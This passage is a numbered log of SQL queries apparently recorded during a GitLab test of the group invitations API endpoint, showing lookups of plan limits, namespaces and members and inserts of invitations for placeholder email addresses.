\"plan_limits\".\"daily_invites\", \"plan_limits\".\"rubygems_max_file_size\", \"plan_limits\".\"terraform_module_max_file_size\", \"plan_limits\".\"helm_max_file_size\", \"plan_limits\".\"ci_registered_group_runners\", \"plan_limits\".\"ci_registered_project_runners\", \"plan_limits\".\"web_hook_calls\", \"plan_limits\".\"ci_daily_pipeline_schedule_triggers\", \"plan_limits\".\"ci_max_artifact_size_cluster_image_scanning\", \"plan_limits\".\"ci_jobs_trace_size_limit\", \"plan_limits\".\"pages_file_entries\", \"plan_limits\".\"dast_profile_schedules\", \"plan_limits\".\"external_audit_event_destinations\", \"plan_limits\".\"dotenv_variables\", \"plan_limits\".\"dotenv_size\", \"plan_limits\".\"pipeline_triggers\" FROM \"plan_limits\" WHERE \"plan_limits\".\"plan_id\" = 58 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       18: SELECT COUNT(*) FROM ((SELECT \"members\".* FROM \"members\" WHERE \"members\".\"source_type\" = 'Namespace' AND \"members\".\"source_id\" IN (SELECT \"namespaces\".\"id\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND (traversal_ids @\u003e ('{1011}'))))\n       UNION\n       (SELECT \"members\".* FROM \"members\" WHERE \"members\".\"source_type\" = 'Project' AND \"members\".\"source_id\" IN (SELECT \"projects\".\"id\" FROM \"projects\" WHERE \"projects\".\"namespace_id\" IN (SELECT namespaces.traversal_ids[array_length(namespaces.traversal_ids, 1)] AS id FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND (traversal_ids @\u003e ('{1011}')))))) members WHERE \"members\".\"invite_token\" IS NOT NULL AND \"members\".\"created_at\" BETWEEN '2022-03-01 00:00:00' AND '2022-03-01 23:59:59.999999' /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       19: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" IN (739, 741) /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       20: SELECT \"members\".* FROM \"members\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_id\" = 1011 AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"user_id\" IN (739, 741) /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       21: SAVEPOINT active_record_2 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       22: SELECT \"users\".* FROM ((SELECT \"users\".* FROM \"users\" WHERE (LOWER(\"users\".\"email\") IN (LOWER('email1@example.com'))))\n       UNION\n       (SELECT \"users\".* FROM \"users\" INNER JOIN \"emails\" ON \"emails\".\"user_id\" = \"users\".\"id\" WHERE \"emails\".\"email\" = 'email1@example.com')) users LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       23: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       24: SELECT 1 AS one FROM ((SELECT \"members\".\"id\", \"members\".\"access_level\", \"members\".\"source_id\", \"members\".\"source_type\", \"members\".\"user_id\", \"members\".\"notification_level\", \"members\".\"type\", \"members\".\"created_at\", \"members\".\"updated_at\", \"members\".\"created_by_id\", \"members\".\"invite_email\", \"members\".\"invite_token\", \"members\".\"invite_accepted_at\", \"members\".\"requested_at\", \"members\".\"expires_at\", \"members\".\"ldap\", \"members\".\"override\", \"members\".\"state\", \"members\".\"invite_email_success\", \"members\".\"member_namespace_id\" FROM \"members\" LEFT OUTER JOIN \"users\" ON \"users\".\"id\" = \"members\".\"user_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"users\".\"state\" = 'active' AND \"members\".\"state\" = 0 AND \"members\".\"requested_at\" IS NULL AND \"members\".\"invite_token\" IS NULL AND (members.access_level \u003e 5) AND (members.access_level \u003e 5) AND \"members\".\"source_id\" = 1011)\n       UNION\n       (WITH \"group_group_links_cte\" AS MATERIALIZED (SELECT \"group_group_links\".* FROM \"group_group_links\" WHERE \"group_group_links\".\"shared_group_id\" = 1011) SELECT \"members\".\"id\", LEAST(\"group_group_links\".\"group_access\", \"members\".\"access_level\") AS access_level, \"members\".\"source_id\", \"members\".\"source_type\", \"members\".\"user_id\", \"members\".\"notification_level\", \"members\".\"type\", \"members\".\"created_at\", \"members\".\"updated_at\", \"members\".\"created_by_id\", \"members\".\"invite_email\", \"members\".\"invite_token\", \"members\".\"invite_accepted_at\", \"members\".\"requested_at\", \"members\".\"expires_at\", \"members\".\"ldap\", \"members\".\"override\", \"members\".\"state\", \"members\".\"invite_email_success\", \"members\".\"member_namespace_id\" FROM \"members\", \"group_group_links_cte\" AS \"group_group_links\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"requested_at\" IS NULL AND \"members\".\"source_id\" = \"group_group_links\".\"shared_with_group_id\" AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"state\" = 0 AND (members.access_level \u003e 5))) members LEFT OUTER JOIN \"users\" ON \"users\".\"id\" = \"members\".\"user_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND ((\"members\".\"user_id\" IS NULL AND \"members\".\"invite_token\" IS NOT NULL) OR \"users\".\"state\" = 'active') AND \"members\".\"requested_at\" IS NULL AND (members.access_level \u003e 5) AND \"members\".\"access_level\" = 50 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       25: SELECT \"members\".* FROM \"members\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"invite_token\" = 'dde4bc4c3a6f96b9bf3600ced225a485d8ccf06558d0f632660958f8fd535a77' ORDER BY \"members\".\"id\" ASC LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       26: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"invite_email\" = 'email1@example.com' AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"source_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       27: SELECT \"namespace_settings\".* FROM \"namespace_settings\" WHERE \"namespace_settings\".\"namespace_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       28: INSERT INTO \"members\" (\"access_level\", \"source_id\", \"source_type\", \"type\", \"created_at\", \"updated_at\", \"created_by_id\", \"invite_email\", \"invite_token\", \"member_namespace_id\", \"notification_level\") VALUES (30, 1011, 'Namespace', 'GroupMember', '2022-03-01 16:06:46.470564', '2022-03-01 16:06:46.470564', 736, 'email1@example.com', 'dde4bc4c3a6f96b9bf3600ced225a485d8ccf06558d0f632660958f8fd535a77', 1011, 3) RETURNING \"id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       29: SELECT \"users\".* FROM ((SELECT \"users\".* FROM \"users\" WHERE (LOWER(\"users\".\"email\") IN (LOWER('email2@example.com'))))\n       UNION\n       (SELECT \"users\".* FROM \"users\" INNER JOIN \"emails\" ON \"emails\".\"user_id\" = \"users\".\"id\" WHERE \"emails\".\"email\" = 'email2@example.com')) users LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       30: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       31: SELECT 1 AS one FROM ((SELECT \"members\".\"id\", \"members\".\"access_level\", \"members\".\"source_id\", \"members\".\"source_type\", \"members\".\"user_id\", \"members\".\"notification_level\", \"members\".\"type\", \"members\".\"created_at\", \"members\".\"updated_at\", \"members\".\"created_by_id\", \"members\".\"invite_email\", \"members\".\"invite_token\", \"members\".\"invite_accepted_at\", \"members\".\"requested_at\", \"members\".\"expires_at\", \"members\".\"ldap\", \"members\".\"override\", \"members\".\"state\", \"members\".\"invite_email_success\", \"members\".\"member_namespace_id\" FROM \"members\" LEFT OUTER JOIN \"users\" ON \"users\".\"id\" = \"members\".\"user_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"users\".\"state\" = 'active' AND \"members\".\"state\" = 0 AND \"members\".\"requested_at\" IS NULL AND \"members\".\"invite_token\" IS NULL AND (members.access_level \u003e 5) AND (members.access_level \u003e 5) AND \"members\".\"source_id\" = 1011)\n       UNION\n       (WITH \"group_group_links_cte\" AS MATERIALIZED (SELECT \"group_group_links\".* FROM \"group_group_links\" WHERE \"group_group_links\".\"shared_group_id\" = 1011) SELECT \"members\".\"id\", LEAST(\"group_group_links\".\"group_access\", \"members\".\"access_level\") AS access_level, \"members\".\"source_id\", \"members\".\"source_type\", \"members\".\"user_id\", \"members\".\"notification_level\", \"members\".\"type\", \"members\".\"created_at\", \"members\".\"updated_at\", \"members\".\"created_by_id\", \"members\".\"invite_email\", \"members\".\"invite_token\", \"members\".\"invite_accepted_at\", \"members\".\"requested_at\", \"members\".\"expires_at\", \"members\".\"ldap\", \"members\".\"override\", \"members\".\"state\", \"members\".\"invite_email_success\", \"members\".\"member_namespace_id\" FROM \"members\", \"group_group_links_cte\" AS \"group_group_links\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"requested_at\" IS NULL AND \"members\".\"source_id\" = \"group_group_links\".\"shared_with_group_id\" AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"state\" = 0 AND (members.access_level \u003e 5))) members LEFT OUTER JOIN \"users\" ON \"users\".\"id\" = \"members\".\"user_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND ((\"members\".\"user_id\" IS NULL AND \"members\".\"invite_token\" IS NOT NULL) OR \"users\".\"state\" = 'active') AND \"members\".\"requested_at\" IS NULL AND (members.access_level \u003e 5) AND \"members\".\"access_level\" = 50 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       32: SELECT \"members\".* FROM \"members\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"invite_token\" = '3941257c1f39a07e0c374865b922648ba1636cdf289691968236f900238f2645' ORDER BY \"members\".\"id\" ASC LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       33: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"invite_email\" = 'email2@example.com' AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"source_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       34: SELECT \"namespace_settings\".* FROM \"namespace_settings\" WHERE \"namespace_settings\".\"namespace_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       35: INSERT INTO \"members\" (\"access_level\", \"source_id\", \"source_type\", \"type\", \"created_at\", \"updated_at\", \"created_by_id\", \"invite_email\", \"invite_token\", \"member_namespace_id\", \"notification_level\") VALUES (30, 1011, 'Namespace', 'GroupMember', '2022-03-01 16:06:46.521194', '2022-03-01 16:06:46.521194', 736, 'email2@example.com', '3941257c1f39a07e0c374865b922648ba1636cdf289691968236f900238f2645', 1011, 3) RETURNING \"id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       36: SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       37: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 739 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       38: SELECT 1 AS one FROM ((SELECT \"members\".\"id\", \"members\".\"access_level\", \"members\".\"source_id\", \"members\".\"source_type\", \"members\".\"user_id\", \"members\".\"notification_level\", \"members\".\"type\", \"members\".\"created_at\", \"members\".\"updated_at\", \"members\".\"created_by_id\", \"members\".\"invite_email\", \"members\".\"invite_token\", \"members\".\"invite_accepted_at\", \"members\".\"requested_at\", \"members\".\"expires_at\", \"members\".\"ldap\", \"members\".\"override\", \"members\".\"state\", \"members\".\"invite_email_success\", \"members\".\"member_namespace_id\" FROM \"members\" LEFT OUTER JOIN \"users\" ON \"users\".\"id\" = \"members\".\"user_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"users\".\"state\" = 'active' AND \"members\".\"state\" = 0 AND \"members\".\"requested_at\" IS NULL AND \"members\".\"invite_token\" IS NULL AND (members.access_level \u003e 5) AND (members.access_level \u003e 5) AND \"members\".\"source_id\" = 1011)\n       UNION\n       (WITH \"group_group_links_cte\" AS MATERIALIZED (SELECT \"group_group_links\".* FROM \"group_group_links\" WHERE \"group_group_links\".\"shared_group_id\" = 1011) SELECT \"members\".\"id\", LEAST(\"group_group_links\".\"group_access\", \"members\".\"access_level\") AS access_level, \"members\".\"source_id\", \"members\".\"source_type\", \"members\".\"user_id\", \"members\".\"notification_level\", \"members\".\"type\", \"members\".\"created_at\", \"members\".\"updated_at\", \"members\".\"created_by_id\", \"members\".\"invite_email\", \"members\".\"invite_token\", \"members\".\"invite_accepted_at\", \"members\".\"requested_at\", \"members\".\"expires_at\", \"members\".\"ldap\", \"members\".\"override\", \"members\".\"state\", \"members\".\"invite_email_success\", \"members\".\"member_namespace_id\" FROM \"members\", \"group_group_links_cte\" AS \"group_group_links\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"requested_at\" IS NULL AND \"members\".\"source_id\" = \"group_group_links\".\"shared_with_group_id\" AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"state\" = 0 AND (members.access_level \u003e 5))) members LEFT OUTER JOIN \"users\" ON \"users\".\"id\" = \"members\".\"user_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND ((\"members\".\"user_id\" IS NULL AND \"members\".\"invite_token\" IS NOT NULL) OR \"users\".\"state\" = 'active') AND \"members\".\"requested_at\" IS NULL AND (members.access_level \u003e 5) AND \"members\".\"access_level\" = 50 AND \"members\".\"user_id\" = 739 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       39: SELECT 1 AS one FROM ((SELECT \"members\".\"id\", \"members\".\"access_level\", \"members\".\"source_id\", \"members\".\"source_type\", \"members\".\"user_id\", \"members\".\"notification_level\", \"members\".\"type\", \"members\".\"created_at\", \"members\".\"updated_at\", \"members\".\"created_by_id\", \"members\".\"invite_email\", \"members\".\"invite_token\", \"members\".\"invite_accepted_at\", \"members\".\"requested_at\", \"members\".\"expires_at\", \"members\".\"ldap\", \"members\".\"override\", \"members\".\"state\", \"members\".\"invite_email_success\", \"members\".\"member_namespace_id\" FROM \"members\" LEFT OUTER JOIN \"users\" ON \"users\".\"id\" = \"members\".\"user_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"users\".\"state\" = 'active' AND \"members\".\"state\" = 0 AND \"members\".\"requested_at\" IS NULL AND \"members\".\"invite_token\" IS NULL AND (members.access_level \u003e 5) AND (members.access_level \u003e 5) AND \"members\".\"source_id\" = 1011)\n       UNION\n       (WITH \"group_group_links_cte\" AS MATERIALIZED (SELECT \"group_group_links\".* FROM \"group_group_links\" WHERE \"group_group_links\".\"shared_group_id\" = 1011) SELECT \"members\".\"id\", LEAST(\"group_group_links\".\"group_access\", \"members\".\"access_level\") AS access_level, \"members\".\"source_id\", \"members\".\"source_type\", \"members\".\"user_id\", \"members\".\"notification_level\", \"members\".\"type\", \"members\".\"created_at\", \"members\".\"updated_at\", \"members\".\"created_by_id\", \"members\".\"invite_email\", \"members\".\"invite_token\", \"members\".\"invite_accepted_at\", \"members\".\"requested_at\", \"members\".\"expires_at\", \"members\".\"ldap\", \"members\".\"override\", \"members\".\"state\", \"members\".\"invite_email_success\", \"members\".\"member_namespace_id\" FROM \"members\", \"group_group_links_cte\" AS \"group_group_links\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"requested_at\" IS NULL AND \"members\".\"source_id\" = \"group_group_links\".\"shared_with_group_id\" AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"state\" = 0 AND (members.access_level \u003e 5))) members LEFT OUTER JOIN \"users\" ON \"users\".\"id\" = \"members\".\"user_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND ((\"members\".\"user_id\" IS NULL AND \"members\".\"invite_token\" IS NOT NULL) OR \"users\".\"state\" = 'active') AND \"members\".\"requested_at\" IS NULL AND (members.access_level \u003e 5) AND \"members\".\"access_level\" = 50 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       40: SELECT 1 AS one FROM \"members\" WHERE \"members\".\"user_id\" = 739 AND \"members\".\"source_type\" = 'Namespace' AND \"members\".\"source_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       41: SELECT \"saml_providers\".* FROM \"saml_providers\" WHERE \"saml_providers\".\"group_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       42: SELECT 1 AS one FROM ((SELECT \"members\".* FROM \"members\" WHERE \"members\".\"source_type\" = 'Namespace' AND \"members\".\"source_id\" IN (SELECT \"namespaces\".\"id\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND (traversal_ids @\u003e ('{1011}'))))\n       UNION\n       (SELECT \"members\".* FROM \"members\" WHERE \"members\".\"source_type\" = 'Project' AND \"members\".\"source_id\" IN (SELECT \"projects\".\"id\" FROM \"projects\" WHERE \"projects\".\"namespace_id\" IN (SELECT namespaces.traversal_ids[array_length(namespaces.traversal_ids, 1)] AS id FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND (traversal_ids @\u003e ('{1011}')))))) members WHERE \"members\".\"user_id\" = 739 AND (\"members\".\"state\" IN (0)) LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       43: SELECT \"namespace_settings\".* FROM \"namespace_settings\" WHERE \"namespace_settings\".\"namespace_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       44: INSERT INTO \"members\" (\"access_level\", \"source_id\", \"source_type\", \"user_id\", \"type\", \"created_at\", \"updated_at\", \"created_by_id\", \"member_namespace_id\", \"notification_level\") VALUES (30, 1011, 'Namespace', 739, 'GroupMember', '2022-03-01 16:06:46.578920', '2022-03-01 16:06:46.578920', 736, 1011, 3) RETURNING \"id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       45: SELECT \"notification_settings\".* FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 739 AND \"notification_settings\".\"source_type\" = 'Namespace' AND \"notification_settings\".\"source_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       46: SELECT 1 AS one FROM \"notification_settings\" WHERE \"notification_settings\".\"user_id\" = 739 AND \"notification_settings\".\"source_type\" = 'Namespace' AND \"notification_settings\".\"source_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       47: INSERT INTO \"notification_settings\" (\"user_id\", \"source_id\", \"source_type\", \"created_at\", \"updated_at\", \"level\") VALUES (739, 1011, 'Namespace', '2022-03-01 16:06:46.605951', '2022-03-01 16:06:46.605951', 3) RETURNING \"id\" /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       48: SELECT \"user_details\".* FROM \"user_details\" WHERE \"user_details\".\"user_id\" = 739 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       49: SELECT \"gitlab_subscriptions\".* FROM \"gitlab_subscriptions\" WHERE \"gitlab_subscriptions\".\"namespace_id\" = 1011 LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       50: SELECT 1 AS one FROM \"web_hooks\" WHERE \"web_hooks\".\"type\" = 'GroupHook' AND \"web_hooks\".\"group_id\" IN (SELECT \"namespaces\".\"id\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = 1011) LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       51: SELECT 1 AS one FROM \"namespaces\" INNER JOIN \"members\" ON \"namespaces\".\"id\" = \"members\".\"source_id\" WHERE \"members\".\"type\" = 'GroupMember' AND \"members\".\"source_type\" = 'Namespace' AND \"namespaces\".\"type\" = 'Group' AND \"members\".\"user_id\" = 739 AND \"members\".\"requested_at\" IS NULL AND (access_level \u003e= 10) LIMIT 1 /*application:test,correlation_id:35f89646-fab2-4e2b-96f9-1d46d92ab3a3,endpoint_id:POST /api/:version/groups/:id/invitations,db_config_name:main*/\n       52: WITH RECURSIVE \"base_and_ancestors\" AS ((SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", 